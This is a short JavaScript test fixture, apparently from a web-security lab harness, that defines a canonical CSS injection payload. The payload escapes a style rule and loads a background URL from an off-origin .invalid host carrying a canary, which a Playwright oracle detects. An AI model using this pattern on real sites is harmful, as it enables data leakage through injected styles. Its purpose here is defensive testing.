// CSS Injection — canonical exploit breaks out of the original CSS rule
// (`red; }`), injects `body { background: url(//x-<canary>.invalid); }`
// (off-origin request carrying the canary in the host portion of the URL —
// the browser oracle's off-origin signal fires), then opens a new rule
// (`.x {`) so the trailing CSS in the page closes cleanly. The off-origin
// fetch fails (.invalid TLD never resolves) but the request is recorded
// by Playwright before resolution.
export const defences = {
  0: {
    canonicalPayload: (canary) => `red; } body { background: url(//x-${canary}.invalid); } .x {`,
    naiveBlockedExpected: false,
    bypassPayloads: [],
  },
}
